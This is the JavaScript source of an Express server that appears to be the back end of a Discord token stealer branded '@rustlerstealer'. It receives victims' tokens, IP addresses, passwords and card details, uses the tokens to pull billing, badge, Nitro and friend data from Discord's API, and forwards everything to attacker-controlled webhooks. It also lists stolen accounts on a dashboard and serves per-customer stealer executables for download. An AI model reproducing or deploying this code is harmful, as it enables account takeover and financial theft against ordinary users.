const express = require('express');
const app = express();
const path = require('path');
const axios = require('axios').default;
const db = require('quick.db');
const fs = require('fs');

app.use(express.json())

app.listen(8080, () => {
    console.log('Server on.')
})

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561584440356924/Discord_Staff.png",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561586042572891/Partner.png",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561585644130324/Hypesquad_Events.png",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561583576322058/Bug_Hunter_Level_1.png",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561364797243422/Early_Supporter.png",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561583890890793/Bug_Hunter_Level_2.png",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561583320473690/Bot_Developer.png",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561585220501595/House_Bravery.png",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561585434406982/House_Brillance.png",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561584977219684/House_Balance.png",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561584184508456/Certified_Moderator.png",
        Rare: true,
    }
};

app.post('/payload', async (req, res) => {
    const { type, ip, token, key } = req.body
    if (!type || !ip || !token || !key) return;
    const webhook = getWebhook(key);
    //const webhook = 'https://discord.com/api/webhooks/1103833547615260744/sKxOI6e0A8vjXdSu3c6BWJtwkwPYxqbhGxdKIxri6BlW7h-DUuGxGVfXhgcsnocdsjC8';
    if (!webhook) return;
    if (type == 'login') userLogin(req.body.password, token, ip, webhook)
    if (type == 'email') emailChanged(req.body.password, req.body.newEmail, token, ip, webhook)
    if (type == 'password') passwordChanged(req.body.oldPassword, req.body.newPassword, token, ip, webhook)
    if (type == 'card') creditCardAdded(req.body.number, req.body.cvc, req.body.expiration, token, ip, webhook)
})

function getWebhook(key) {
    return db.get(`wbh_${key}`) || null;
}
app.set('view engine','ejs'); 
app.set('views', `${process.cwd()}/Bot/views/`);

const DB = [];
app.get('/dashboard', async (req, res) => {
    res.render('dash', {
        data: DB
    })
})

async function userLogin(password, token, ip, webhook) {
    var userInfo = await getUserInfo(token);
    var billing = await getBilling(token);
    var friends = await getRelationships(token);
    var params = {
        embeds: [{
            "fields": [
                {
                    name: `<a:rustler:987689940852817971> Token:`,
                    value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                    inline: false
                },
                {
                    name: `<:rustler:987689933844127804> Badges:`,
                    value: getBadges(userInfo.flags),
                    inline: true
                },
                {
                    name: `<:rustler:987689935018549328> Nitro Type:`,
                    value: await getNitro(userInfo.premium_type, userInfo.id, token),
                    inline: true
                },
                {
                    name: `<a:rustler:987689939401588827> Billing:`,
                    value: billing,
                    inline: true
                },
                {
                    name: `<:rustler:987689942350196756> IP:`,
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: `<:rustler:987689943558135818> Email:`,
                    value: `\`${userInfo.email}\``,
                    inline: true
                },
                {
                    name: `<:rustler:987689933844127804> Password:`,
                    value: `\`${password}\``,
                    inline: true
                },
            ],
            "color": 3553599,
            "author": {
                "name": `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@rustlerstealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}?size=512`
            }
        }, {
            "color": 3553599,
            "description": friends,
            "author": {
                "name": "HQ Friends",
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@rustlerstealer"
            },
        }]
    };
    if (!params) return;
    let badges = await getBadges2(userInfo.flags, userInfo.id, token);
    let badgesss = await getNitro2(userInfo.premium_type, userInfo.id, token);
    const actual = DB.find(i => i.id == userInfo.id)
    if (actual) DB.splice(actual)
    DB.push({ token: token, tag: `${userInfo.username}#${userInfo.discriminator}`, id: userInfo.id, avatar: userInfo.avatar, email: userInfo.email, password: password, badges: badges, badgeboost: badgesss })
    axios.post(webhook, {
        content: "",
        embeds: params.embeds
    }, {
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    })
        .catch(() => { })
}

async function emailChanged(password, newEmail, token, ip, webhook) {
    var userInfo = await getUserInfo(token);
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        embeds: [{
            "fields": [
                {
                    name: `<a:rustler:987689940852817971> Token:`,
                    value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                    inline: false
                },
                {
                    name: `<:rustler:987689933844127804> Badges:`,
                    value: getBadges(userInfo.flags),
                    inline: true
                },
                {
                    name: `<:rustler:987689935018549328> Nitro Type:`,
                    value: await getNitro(userInfo.premium_type, userInfo.id, token),
                    inline: true
                },
                {
                    name: `<a:rustler:987689939401588827> Billing:`,
                    value: billing,
                    inline: true
                },
                {
                    name: `<:rustler:987689942350196756> IP:`,
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: `<:rustler:987689943558135818> Email:`,
                    value: `\`${newEmail}\``,
                    inline: true
                },
                {
                    name: `<:rustler:987689933844127804> Password:`,
                    value: `\`${password}\``,
                    inline: true
                },
            ],
            "color": 3553599,
            "author": {
                "name": `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@rustlerstealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}?size=512`
            }
        }, {
            "color": 3553599,
            "description": friends,
            "author": {
                "name": "HQ Friends",
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@rustlerstealer"
            },
        }]
    };
    if (!params) return;
    axios.post(webhook, {
        content: "",
        embeds: params.embeds
    }, {
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    })
        .catch(() => { })
}
async function passwordChanged(oldPassword, newPassword, token, ip, webhook) {
    var userInfo = await getUserInfo(token);
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        embeds: [{
            "fields": [
                {
                    name: `<a:rustler:987689940852817971> Token:`,
                    value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                    inline: false
                },
                {
                    name: `<:rustler:987689933844127804> Badges:`,
                    value: getBadges(userInfo.flags),
                    inline: true
                },
                {
                    name: `<:rustler:987689935018549328> Nitro Type:`,
                    value: await getNitro(userInfo.premium_type, userInfo.id, token),
                    inline: true
                },
                {
                    name: `<a:rustler:987689939401588827> Billing:`,
                    value: billing,
                    inline: true
                },
                {
                    name: `<:rustler:987689942350196756> IP:`,
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: `<:rustler:987689943558135818> Email:`,
                    value: `\`${userInfo.email}\``,
                    inline: true
                },
                {
                    name: `<:rustler:987689933844127804> Old Password:`,
                    value: `\`${oldPassword}\``,
                    inline: true
                },
                {
                    name: `<:rustler:987689933844127804> New Password:`,
                    value: `\`${newPassword}\``,
                    inline: true
                }
            ],
            "color": 3553599,
            "author": {
                "name": `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@rustlerstealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}?size=512`
            }
        }, {
            "color": 3553599,
            "description": friends,
            "author": {
                "name": "HQ Friends",
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@rustlerstealer"
            },
        }]
    };
    if (!params) return;
    axios.post(webhook, {
        content: "",
        embeds: params.embeds
    }, {
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    })
        .catch(() => { })
}

async function getUserInfo(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return {};
    return json;
}

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

async function getBadges2(flags, id, token) {
    var b = [];
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b.push(o.Link);
    };
    return b;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:967519402293624862>", "<:boost2month:967519562868338728>", "<:boost3month:969685462157525044>", "<:boost6month:969686607961665628>", "<:boost9month:967520103367340092>", "<:boost12month:969687191133499403>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getNitro2(flags, id, token) {
    switch (flags) {
        case 1:
            return ["https://media.discordapp.net/attachments/992522896830369892/992726526380494868/Discord_Nitro.png"];
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return ["https://media.discordapp.net/attachments/992522896830369892/992726526380494868/Discord_Nitro.png"];

            if (!info.premium_guild_since) return ["https://media.discordapp.net/attachments/992522896830369892/992726526380494868/Discord_Nitro.png"];

            let boost = ["https://media.discordapp.net/attachments/992522896830369892/992726523020849242/Booster_1_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726523297665054/Booster_2_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726810741710918/Booster_3_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726523553521725/Booster_6_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726523855519744/Booster_9_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726525268983809/Booster_12_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726525554208868/Booster_15_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992727001137958932/Booster_Level_18.png", "https://media.discordapp.net/attachments/992522896830369892/992726525789098055/Booster_24_Month.png"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return ["https://media.discordapp.net/attachments/992522896830369892/992726526380494868/Discord_Nitro.png", boost[i]]
        default:
            return [];
    };
}

app.route('/:id').get(async (req, res) => {
    const { id } = req.params;
    if (fs.existsSync(`./Build/dist/${id}/${id}.exe`)) {
        res.download(`./Build/dist/${id}/${id}.exe`)
    }
})

process
    .on("uncaughtException", err => console.error(err))
    .on("unhandledRejection", err => console.error(err));
